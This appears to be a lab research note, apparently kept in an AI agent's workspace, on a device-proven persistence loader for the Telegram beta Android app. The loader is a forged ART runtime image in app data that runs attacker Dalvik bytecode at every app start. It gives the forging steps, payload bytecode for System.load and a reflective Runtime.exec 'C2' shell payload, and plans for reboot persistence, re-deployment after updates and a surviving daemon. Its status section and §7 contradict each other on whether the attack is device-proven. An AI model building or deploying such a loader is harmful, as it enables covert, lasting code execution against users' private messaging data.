# ART app-image startup loader for Telegram 72799 (Sony XQ-BT52)

Status: **DEVICE-PROVEN 2026-11-03.** A forged
`cache/oat_primary/arm64/base.art` is accepted by ART and its forged
`ks.<clinit>` runs attacker Dalvik bytecode in the app process (`System.load`
of an app-data `.so`); the app then continues normal startup. The marker was
written on cold start and on the boot-receiver path, with the process alive
and `loaded normal lib` in logcat. See §0 for the raw evidence and the v4
layout fix (two dummy `ArtField`s so the methods header no longer overwrites
`ks.h`/`ks.i`). The image is **reboot-persistent** (the boot receiver starts
the process); it is **not automatic across an app update** (the update changes
the `/data/app/~~…` code path, ART rejects the stale image and regenerates
`base.art`); re-running the generator on the new image and re-deploying works.
§6 is the original device-test plan, kept for reference.

Companion material lives in `lab/loader_art/`:

| file | content |
|---|---|
| `art17_layout.md` | device ART object/image layouts, derived from image + IDA + art17 sources |
| `tombstone_analysis.md` | the `fault 0x60` tombstone, decoded instruction by instruction |
| `gen_loader_image.py` | generator (fixed class, vtable, iftable, DexCache, payload) |
| `dalvik.py` | Dalvik `code_item` builder for the two payloads |
| `validate_loader_image.py` | host validator (header, class, vtable, bitmap, class table, code item) |
| `tools/dex_ids.py` | verifies every dex constant the image and payload rely on |
| `tools/payload_xref/` | javac+d8 cross-check of the hand-assembled Dalvik encodings |
| `payload/marker.S`, `payload/build_so.sh` | freestanding AArch64 marker `.so` for the `load` payload |
| `device_test.sh` | pull / gen / deploy / verify / restore orchestration |
| `gen_loader_image_v4.py` | v4 generator: two dummy `ArtField`s keep the methods header off `ks.h`/`ks.i` |

---

## 0. Device proof (2026-11-03)

Target: Sony XQ-BT52, Android 13, `org.telegram.messenger.beta` 13.2.0 /
72799, UID 10357. Root was used only to pull/place the 16 KB image and the
marker `.so` deterministically; the final write is app-UID (the live
`base.art` is `10357:20357`, and `cache/oat_primary/arm64` is app data).

### 0.1 Cold start

Live source image md5 `7be328aa72e60ca208d4cb43ec937f00` (1,418,992 B).
Generated with `gen_loader_image_v4.py --payload load --path
/data/user/0/org.telegram.messenger.beta/files/libmarker.so`:
`base_art_forged_v4.art`, md5 `600baf20e1cc98cf94f423f222762233`, 16,464 B.
`libmarker.so` md5 `800fc1a58e7c9abe0b164cc4a05cb556`; its `.init_array`
does a raw `openat/write/close` of

```
/data/user/0/org.telegram.messenger.beta/files/.loader_art_marker
```

(marker text `loader_art: JNI_OnLoad/init_array ran in the app process`).

After `am force-stop` + `am start -n …/LaunchActivity`:

```
D nativeloader: Load /data/user/0/…/files/libmarker.so …: ok
D tmessages: loaded normal lib
```

- marker file exists, owner `u0_a357`, 57 B;
- app process alive (`ps` shows `u0_a357 … org.telegram.messenger.beta`);
- no `SIGSEGV`, no tombstone, no `Invalid image`/`Failed to open app image`.

The `<clinit>` code item ran **before** `ks.g`'s normal `System.loadLibrary`;
the real library then loaded and the app continued. This is a local ACE in the
Telegram process, triggered by an app process start, with no user tap.

### 0.2 Boot-receiver path (no reboot)

The app declares `AppStartReceiver` for `android.intent.action.BOOT_COMPLETED`
and the custom `org.telegram.start` (manifest line 814). After
`am force-stop`, a root-issued explicit broadcast
`am broadcast -a org.telegram.start -n
org.telegram.messenger.beta/org.telegram.messenger.AppStartReceiver
--include-stopped-packages` produced:

```
ActivityManager: Start proc 28182:org.telegram.messenger.beta/u0a357
  for broadcast:NA/org.telegram.start
D nativeloader: Load …/files/libmarker.so …: ok
D tmessages: loaded normal lib
```

and the marker was written; process alive. `BOOT_COMPLETED` targets the same
receiver and therefore the same process-start/ART-image path. No reboot was
performed (per instruction); this is the boot component without rebooting.

### 0.3 The v4 layout fix (why the first device run crashed)

The first device run (`gen_loader_image.py`, old layout) wrote the marker, then
crashed in normal app startup:

```
#00 NterpGetInstanceFieldOffset
#03 org.telegram.messenger.ks.i+278
#05 org.telegram.messenger.uz.t+870
#09 art::ClassLinker::InitializeClass+3928
fault addr 0x60
```

Root cause: the methods array header was placed 20 bytes before the fake
`ArtField` block, so it overlapped the **last 20 bytes of the real `ks` fields
array** (fields 7/8, `ks.h`/`ks.i`). `ks.i(SharedPreferences)` then resolved a
corrupted field and faulted. v4 appends **two dummy `ArtField`s** to the fields
array; the 20-byte methods header now lands on the dummies, while fields 0–8
(`a,b,c,d,e,f,g,h,i`) remain byte-identical to the source. The class's
`fields_` length is 11; `ks`'s real fields still resolve. v4 passes every
validator check except the intentionally stale `nf == 9` assertion.

### 0.4 App update: re-deploy, not automatic

`adb install -r /tmp/opencode/tg72799_base.apk` (same 72799) changed the code
path `~~G0ZPZt9-…` → `~~N60_aICAk…`. The forged image survived on disk
(md5 unchanged) but was rejected on the next start:

```
Failed to open image dex files: Failed to find OatDexFile for DexFile
/data/app/~~G0ZPZt9-…/base.apk in OatFile
/data/app/~~N60_aICAk…/oat/arm64/base.odex
```

and ART regenerated `base.art` (md5 `82a71e0aab0f720575ebd174279ec556`,
1,145,088 B). Pulling that new image, regenerating with v4
(`base_art_postupdate_forged.art`, md5 `122497bf77bbdb3c1321fe8b054a8d8e`)
and re-deploying restored execution on the next cold start (marker + process
alive + `loaded normal lib`). So the ART loader is **reboot-persistent and
re-deployable after update**, but the update itself invalidates the image
(code-path/oat binding); it does not survive an update unattended. The first
RCE can re-deploy by regenerating from the post-update `base.art`; a user tap /
alarm+overlay / job is still needed to re-trigger the first RCE after the
update. The only device-proven automatic re-trigger is the activity
PendingIntent alarm + `SYSTEM_ALERT_WINDOW` (`notes/post_update_retrigger.md`:
survives `install -r`, opens the widget chat, re-runs the first RCE). Without
the overlay, the user must open the widget chat. No data-only standalone
update survival exists in 72799: the installer kills the app before the new
`/data/app/~~…` path is created, the app image is path/dex-bound, and the only
app-data loaders (`ks` fallback, ART) are gated or invalidated.

### 0.5 Artifacts

- `lab/loader_art/gen_loader_image_v4.py`, `payload/marker.S` (AAPCS64 fix:
  the constructor preserves `x19`; the earlier version clobbered the linker's
  `soinfo*` and crashed in `call_constructors`).
- Host images: `/tmp/opencode/loader_art_live/base_art_forged_v4.art` and
  `base_art_postupdate_forged.art` (ephemeral).
- Device: `/data/user/0/org.telegram.messenger.beta/files/libmarker.so`,
  `.loader_art_marker`; backups `.base.art.orig` (pre-update),
  `.base.art.postupdate.orig` (post-update legit).

---

## 1. Where the previous attempt stopped

`notes/persistence_local_existing_rce.md` §7.3: the forged image was accepted,
mapped at `0x6a000000`, `w0.onCreate` reached the forged `ks` class, and the
process died in `ClassLinker::InitializeClass+980` with `fault addr 0x60`,
`x22 = 0xa`, `x8 = 0x50`.

`tombstone_analysis.md` shows, from the device `libart.so`, that this is
`ValidateSuperClassDescriptors()` inlined into `InitializeClass`:

```
66c9c0  ADD X9, X8, #0x24      ; &klass->vtable_
66c9c8  LDR W0, [X9]           ; vtable_ == 0
66c9d4  ADD X8, X0, X22,LSL#3  ; 0 + 10*8 = 0x50
66c9d8  LDR X3, [X8,#0x10]     ; fault 0x60
```

The loop runs because the image loader forces the app class loader onto every
class-table entry (`class_linker.cc:2390`, visible in the tombstone as
`class_loader_ = 0x0201d628`) while `java.lang.Object` is bootstrap-loaded, so
`klass->GetClassLoader() != super->GetClassLoader()` is always true for an
image class with a boot superclass. The forged class had `vtable_ = 0`, and
release builds do not re-check `GetVTableEntry`'s bounds, hence the plain null
dereference. It was not a class-def or compressed-reference problem: every
scalar field in the dump (`dex_type_idx 0x1cc6`, `dex_class_def_idx 0x11d`,
`fields_ = 0x6a001208`, `methods_ = 0x6a001288`, `status 0xb0000000`) is at the
offset art17 predicts.

## 2. The fix

### 2.1 Class fields

| field | old image | new image | why |
|---|---|---|---|
| `vtable_` (0x24) | 0 | copy of the real 11-entry `PointerArray`, in image | `ValidateSuperClassDescriptors` reads `GetVTableEntry(10)` |
| `iftable_` (0x18) | 0 | real value (`0x70cd7e40`, boot image shared empty `IfTable`) | next statement is `klass->GetIfTableCount()` |
| `monitor_` (0x04) | 0 | 0 | matches the real class |
| `class_loader_` (0x08) | 0 | 0 (ART overwrites it) | not controllable |
| `dex_class_def_idx_` (0x48) | 285 | 285 | keeps `HasStaticFields()` false and `NumDirectInterfaces()` 0 |
| `dex_type_idx_` (0x4c) | 7366 (ks) | 7366 | descriptor hash/lookup use the dex, not `name_` |
| `status_` (0x68) | kVerified | kVerified | `<clinit>` will run |
| rest | as before | as before | see `art17_layout.md` |

Why a copied vtable is enough: `ks` declares **16 direct methods and 0 virtual
methods**, so its real vtable is a verbatim copy of `java.lang.Object`'s
vtable - length 11, every entry a boot-image `ArtMethod*`
(`tools/dex_ids.py` prints the dex fact; the image dump shows the 11 entries at
`0x730e8890+16`). With the same entries as the superclass, every
`m == super_m` test in the validation loop is true, so
`HasSameSignatureWithDifferentClassLoaders()` is never called - which matters
because that function would resolve types through the DexCache arrays the image
does not carry.

`iftable_` is kept because the loop that follows the vtable loop is
`for (i < klass->GetIfTableCount())`; `GetIfTable()` has no null check outside
DCHECK builds. The real `ks` iftable already points at the boot image's shared
empty table (count 0), so keeping the value is both correct and free.

### 2.2 Class-def substitution (285 instead of 5862)

The forged class claims `dex_class_def_idx_ = 285`
(`Landroid/support/v4/media/a;`: 0 static fields, 0 interfaces, 16 methods)
while `dex_type_idx_ = 7366` (`Lorg/telegram/messenger/ks;`). That split is
deliberate:

* `Class::HasStaticFields()` is `ClassAccessor(GetDexFile(), class_def_idx)
  .NumStaticFields() != 0` - not a flag - so with 5862 `InitializeClass` would
  walk the 9 static fields, allocate DexCache arrays, re-resolve every field and
  replay the encoded static values into the Class object. With 285 that whole
  block is skipped.
* `NumDeclaredMethods()` is 16 for both class defs, which is what makes the
  16-entry copied method array consistent.
* `NumDirectInterfaces()` comes from 285's `interfaces_off_ == 0`; with ks
  (also 0 interfaces) it would be the same, but 285 keeps the static-field
  hazard out.

The cost is that the class is a chimera. Nothing on the init path compares the
type index with the class def, but a future ART build that does would reject or
mismatch it - a fail-closed outcome, not a crash, since the class-def mismatch
would surface as a failed load or a failed class init. Keeping 5862 is the
fallback if a future build breaks this (`gen_loader_image.py` has no switch for
it; it is a two-line change plus re-running the validator).

### 2.3 `<clinit>` execution path (unchanged trick, now with a dependency)

`<clinit>` must run our code item, but a valid image stores a 32-bit *dex code
item offset* in `ArtMethod::data_` and the loader rewrites it with
`GetDexFile()->GetCodeItem(offset)` (`class_linker.cc:2313`). A hand-built
pointer in `data_` would be truncated and reinterpreted as a huge dex offset.

The image therefore marks the `<clinit>` `kAccAbstract` (0x400), which makes
`HasCodeItem()` false so the rewrite is skipped, and smuggles the pointer in
via the `kSectionArtFields` walk: a one-element `LengthPrefixedArray<ArtField>`
is placed at `methods_ + 20`, so its first `declaring_class_` GcRoot lands
exactly on `method[0].data_` and the relocator writes `image_base + code_off`
there (`gen_loader_image.py` step 7; the validator asserts the alias).

Consequence to keep in mind: the method is now "not invokable", so the payload
only runs because the entry point is **nterp**. At load,
`if (method.GetEntryPointFromQuickCompiledCode() == nterp_trampoline_)` is
outside the `HasCodeItem()` check (`class_linker.cc:2332`), so the entry is
replaced by `interpreter::GetNterpEntryPoint()`, and `ExecuteNterpImpl` reads
`data_` and executes it without an `IsInvokable()` test. The alternative entry,
`artQuickToInterpreterBridge`, *does* test `IsInvokable()` and would throw
`AbstractMethodError` - so this design depends on `CanRuntimeUseNterp()` being
true (it is on a non-debuggable arm64 user build; the previous tombstone shows
`nterp_helper` on the stack for `w0.onCreate`). If a future ART build disables
nterp, the payload stops running (class init throws) and the app crashes once
per start; the fix would be to enter through a concrete method instead.

The method is also a class initializer, so the JIT ignores it
(`Jit::IgnoreSamplesForMethod`, `jit.cc:1452`), which makes the zero hotness
counter written by the overlay (`length == 1` on `method_index_/hotness`) safe.

### 2.4 DexCache arrays

`kSectionDexCacheArrays` exists only because DexCache[1]'s
`resolved_types_array_` points into it (789 roots). The old generator copied
the section and zeroed the roots. The new generator instead zeroes that
DexCache pointer field in the copied prefix (`--dexcache-arrays null`, the
default), which removes the section entirely: the image shrinks from ~3.6 MB to
16 KB and the relocator has nothing to walk. `--dexcache-arrays keep`
reproduces the old behaviour for comparison; both variants validate.

---

## 3. The payload

`dalvik.py` builds the `code_item`; `gen_loader_image.py --payload load|exec`
selects it.

### 3.1 `load` (default, minimal)

```
const/16 v0, #len
new-array v0, v0, [C
fill-array-data v0, path
new-instance v1, Ljava/lang/String;
invoke-direct {v1, v0}, Ljava/lang/String;-><init>([C)V
move-result-object v1
invoke-static {v1}, Ljava/lang/System;->load(Ljava/lang/String;)V
return-void
```

8 instructions, `registers=2, ins=0, outs=1`. The `String` is built from a
`char[]` because `const-string` would need a string index in the dex; only
boot-image methods are touched (`String.<init>([C)V` = method id 25992,
`System.load(String)V` = 26112, both present in classes.dex, see
`tools/dex_ids.py`).

`payload/marker.S` + `build_so.sh` build a 67 KB freestanding AArch64 `.so`
with no `DT_NEEDED`; its `.init_array` entry does
`openat(AT_FDCWD, "/data/user/0/org.telegram.messenger.beta/files/.loader_art_marker",
O_WRONLY|O_CREAT|O_APPEND, 0600)` + `write` + `close` with raw syscalls, so the
proof does not depend on libc or JNI.

Caveat for `System.load` from app data: the class-loader linker namespace must
permit the path. It normally does for the app's own `files/` directory, but it
is the one runtime restriction this payload can hit; the `exec` payload is the
fallback that never touches the linker.

### 3.2 `exec` (proof of execution / C2)

classes.dex contains **no** reference to `Runtime.exec`, so the call has to go
through reflection:

```
char[] cmd -> String cmd
char[] "exec" -> String name
Runtime rt = Runtime.getRuntime();
Class c = rt.getClass();
Method m = c.getDeclaredMethod(name, new Class[]{ String.class });
m.invoke(rt, new Object[]{ cmd });
return-void
```

27 instructions, `registers=10, outs=3`, ids 25968 (getRuntime), 25950
(getClass), 25760 (getDeclaredMethod), 26213 (Method.invoke), types 15614
([C), 5208 (String), 15964 (Class[]), 15971 (Object[]), 5162 (Class). The
command is a single `Runtime.exec(String)` token list (no spaces allowed in
paths), e.g. `/system/bin/sh /data/user/0/org.telegram.messenger.beta/files/.p`.

### 3.3 Three payload-builder bugs fixed

The old `payload_builder.py` would have failed *inside* the class initializer,
before the intended `System.load`/`exec` ever ran. All three defects were found
on the host; the third one only by cross-checking against javac/d8 output:

1. **`fill-array-data` element count.** The array was allocated with
   `len(s)` elements but the payload contained `len(s)+1` (`utf16z`). ART's
   `FillArrayData()` (`entrypoints/entrypoint_utils.cc:168`) throws
   `ArrayIndexOutOfBoundsException` when `element_count > array->GetLength()`,
   so the first `fill-array-data` would have thrown inside the class
   initializer. The new builder writes exactly `len(s)` elements.
2. **`new-array` nibbles.** Format 23c is `AA`=destination, `BB`=size; the old
   builder emitted `size<<4 | dst`. Harmless only because every call site used
   the same register for both.
3. **`invoke-*` / `filled-new-array` nibbles.** Format 35c is
   `A(count)|G(register)`, with the argument/element count in the *high* nibble.
   The old builder emitted `G<<4 | count`. javac+d8+dexdump produce
   `7020 0700 5000` for `new String(char[])` (A=2), i.e. the builder's
   `7002 ...` would have told the interpreter "zero arguments, register v2" and
   the call would have been malformed.

`tools/payload_xref/xref.sh` rebuilds the equivalent Java with javac/d8 and
diffs the dexdump disassembly against `expected_load.txt` / `expected_exec.txt`,
so the reference encodings are reproducible. `validate_loader_image.py`
additionally decodes the emitted instruction stream, tracks
`const/16` -> `new-array` sizes, checks every `fill-array-data` payload against
its array, checks each invoke's `A` field against the method's real arity, and
rejects a `move-result-object` after a void call. The old payload did
`move-result-object` right after `String.<init>`; a constructor returns `void`,
so the result register is undefined for the callee and moving it can overwrite
the register that already holds the new instance.

### 3.4 What the app loses

`ks.<clinit>` normally only builds a `StringBuilder` (`ks.b`) and two constant
byte arrays (`ks.c`, a 623-byte JPEG header, and `ks.d`) - verified with
`dexdump` on classes.dex. It does not load the library. `ks.g(Context)` does
(`System.loadLibrary("tmessages.49")`, then falls back to
`files/lib/libtmessages.49loc.so`), and `w0.onCreate` calls `ks.g` right after
the class init. So replacing `<clinit>` costs only those placeholder fields;
the normal `loaded normal lib` path is unaffected as long as the library loads
(the fallback path would NPE on the null `ks.b` string builder).

---

## 4. What host validation does and does not prove

`validate_loader_image.py IMAGE --source ORIGINAL.art --expect-payload load`
re-checks, without ART: header arithmetic (`IsValid`, reservation, file size,
bitmap offset), the exact class field values, the vtable (in image, length 11,
entries identical to the source, all boot `ArtMethod`s), the iftable, the
fields/methods arrays and the fake-ArtField alias, the bitmap marks, the
serialized class table (`num_elements <= num_buckets`, slot = `Class|hash`),
the DexCache array fields (must be 0 or in-image), the code item, and the
Dalvik instruction stream.

It cannot prove that `InitializeClass` runs to completion, that nterp executes
the code item, or that the payload's resolutions succeed. Those are exactly
the device-test steps.

---

## 5. Survival and lifetime

### 5.1 The file is the runtime image, not a dex2oat image

`cache/oat_primary/arm64/base.art` is written by the *runtime* at the end of a
startup (`RuntimeImage::WriteImageToDisk` from `StartupCompletedTask`,
`runtime_image.cc:1846` gives the path) because the app is not AOT-compiled.
Both loader paths in `oat_file_manager.cc:330-375` read that same path, and the
earlier device log (`Could not load runtime generated app image: Invalid image
header`) confirms the runtime-image path is the one in use.

Three consequences:

* **While the forged image loads, it is stable.** `StartupCompletedTask` only
  regenerates the file when `!heap->HasAppImageSpaceFor(primary_apk_path)`, and
  a successfully attached image space for the APK makes that false. So the
  loader survives app restarts, `am force-stop` and reboots.
* **A rejected image is self-healing.** The app starts without an app image
  space, and the runtime overwrites `base.art` at the end of that start with a
  fresh runtime image (the `02be87ce…`, 1 161 488 B file the earlier lab
  observed). A bad deployment costs one crash-free start, not the app.
* **An accepted image that crashes is a boot loop.** The image space is added
  *before* the class initializer runs, so the file is not rewritten; if the
  payload or the class init faults, every following start crashes the same way.
  Recovery needs root/adb (or a pre-arranged app-UID channel that does not
  depend on the app starting) - plan the device test accordingly.

### 5.2 App update / ART update

* The image is keyed to (a) the boot image: `boot_image_begin/size/
  component_count/checksum` (checked by `ValidateBootImageChecksum`), and
  (b) the installed dex/oat/vdex: the four DexCaches are populated from
  `base.oat` by `OpenAndSetDexFiles`, and the class ids/offsets baked into the
  image must match the dex. An app update replaces the dex and the oat, an ART
  mainline update changes the boot image; either invalidates the image, and the
  runtime then regenerates `base.art`.
* `image_checksum_` and `oat_checksum_` are written as 0, which is what a
  runtime image has, and `InitAppImage` skips the oat checksum comparison when
  `oat_checksum_ == 0`. That is deliberate; it does not make the image survive
  a boot-image change.
* **Re-deployment after an update** is possible only by running the first
  exploit again (the app-UID write primitive), between the update and the next
  start. It is not automatic: the ART image gives persistence against
  *restarts*, not against *updates*, and it cannot bootstrap the write
  primitive by itself. Two candidate re-trigger paths, neither device-proven:
  * the widget chat path analysed in `notes/post_update_retrigger.md`: alarms
    and JobScheduler jobs do survive a package update on AOSP 13, but the
    widget sandbox only starts from the chat view and an alarm-driven activity
    start needs `SYSTEM_ALERT_WINDOW`; a background process start alone does not
    render the widget. So this path is conditional, and it is the same path
    that must be re-run on the *new* version;
  * the `exec` payload's app-UID daemon: it is a separate process, so it may
    outlive the update and could rewrite `base.art` itself once a new image has
    been generated. That would break the circular dependency, but its
    post-update survival and its ability to write while the app is not running
    are unmeasured here. If it works, it is the cleanest way to make the loader
    survive updates: "on new `base.art`, forge and replace".
* If the update fixes the widget trigger and no daemon survives, the loader is
  lost. The ART image is the only app-data *startup* loader found so far; it is
  the piece that re-establishes code execution at app start without a new
  in-app trigger - which is exactly why its post-update loss matters.

---

## 6. Device test plan (Sony XQ-BT52)

Preconditions: root or another way to write `/data/user/0/<pkg>/...`; the
original `base.art` pulled and stored off-device; app data not cleared. **Do
not run this without a working restore path** - see §5.1 (an accepted image
that crashes boot-loops the app).

`lab/loader_art/device_test.sh` implements the steps:

```sh
cd lab/loader_art
./device_test.sh pull        # cp base.art -> files/.base.art.orig, pull to /tmp/opencode/loader_art/
./device_test.sh gen         # gen_loader_image.py + validate_loader_image.py on the host
./device_test.sh deploy /tmp/opencode/loader_art/base_art_forged.art
./device_test.sh verify
./device_test.sh restore     # always available
```

| # | step | success signal | failure signal |
|---|---|---|---|
| 1 | pull the live image, `gen` | validator `RESULT: PASS`, image ~16 KB | validator FAIL -> do not deploy |
| 2 | push `libmarker.so` (or `.p` for `exec`) to `files/`, mode 600 | file present | write error |
| 3 | deploy, `am force-stop`, cold start | process stays up (no tombstone, chat list renders), no `Failed to open app image` | `Failed to open app image`, `Invalid image header`, `Boot image checksum mismatch`, `Could not load runtime generated app image` -> image rejected, app fine, regenerate |
| 4 | check the marker | `files/.loader_art_marker` exists with the message (or `.p_started` for `exec`) | marker absent but app runs -> class init failed or the payload threw; tombstone/logcat |
| 5 | check normal startup | `loaded normal lib` in logcat, chat list renders | crash after the marker -> payload ran, startup chain broke (report, then restore) |
| 6 | repeat cold starts 3x, then reboot and start | marker timestamp updates each start | marker only once -> the runtime overwrote the image (check `HasAppImageSpaceFor` path) |
| 7 | restore the backup, force-stop, cold start | normal chat list | - |

Diagnostics to capture on failure: `adb logcat -d | grep -E 'base.art|app image|
ClassLinker|Invalid image|loaded normal lib'`, `/data/tombstones/*` (root), and
the md5 of `base.art` to see whether the runtime regenerated it. A tombstone
that faults inside `InitializeClass` again but at a *different* address is
progress; a fault in `ValidateSuperClassDescriptors` at `0x60` now means the
vtable was not copied (e.g. `--vtable zero`).

---

## 7. Residual risks and open questions

1. **Not proven on device.** The class layout, the vtable-copy argument and
   the payload encoding are verified statically; the class init and the payload
   are not.
2. **nterp dependency** (§2.3). A future ART build that routes the abstract
   `<clinit>` through `artQuickToInterpreterBridge` turns the payload into an
   `AbstractMethodError`.
3. **Chimera class** (§2.2). `dex_class_def_idx 285` with `dex_type_idx 7366`
   is accepted by this build; a future validation could reject it.
4. **`System.load` namespace.** If the linker refuses app-data `.so` files on
   this firmware, use the `exec` payload (same class/image, different code
   item).
5. **`class_loader_` is forced** to the app loader. If a future build changes
   `UpdateAppImageClassLoadersAndDexCaches` to skip image classes, the vtable
   loop disappears (harmless) - but if it instead sets a loader on the *super*,
   nothing changes either. The design does not depend on the loader keeping
   `0`.
6. **Fields 7/8 overlap** in the copied `ks` field array (the methods header
   and the fake ArtField overlay overwrite parts of them). `ks.g` uses only
   fields 0/1 on the success path, but any later `ks` method that reads `ks.h`
   or `ks.i` sees garbage. This is inherited from the previous design and could
   be removed by placing the methods array after the fields array and putting
   the fake overlay elsewhere, at the cost of a second relocated pointer.
7. **Crash-loop hazard** (§5.1): the device test must be run with a restore
   path already open.
8. **Payload proof marker**: the `exec` payload's `/system/bin/sh` path relies
   on `Runtime.exec` splitting on spaces; the `load` payload relies on the
   linker namespace. Neither has been observed running.

---

## 8. Reproduce the host side

```sh
cd lab/loader_art
export PWNLIB_NOTERM=1                     # pwntools in the ART-venv
PY=/tmp/opencode/artow_venv/bin/python      # pwntools + lz4 (vendor/art.py)
$PY gen_loader_image.py \
  --base-art ../persistence_nonquickjs/sample/base_72799_original.art \
  --out /tmp/opencode/loader_load.art --payload load
python3 validate_loader_image.py /tmp/opencode/loader_load.art \
  --source ../persistence_nonquickjs/sample/base_72799_original.art \
  --expect-payload load
python3 tools/dex_ids.py /path/to/classes.dex     # dex constants
payload/build_so.sh                               # AArch64 marker .so
```

Expected: a 16 464-byte image (`load`, md5 `313d4ab873586ae00556c74a6fb8ce00`
for the sample original), offsets and md5 in the sidecar `*.art.json`,
validator `RESULT: PASS`. `--payload exec` gives the 16 464-byte exec image
(md5 `a75a5d190c507cebad8a7fecf96a8d80`); `--vtable zero` produces the old
crash reproducer, which the validator rejects on purpose.
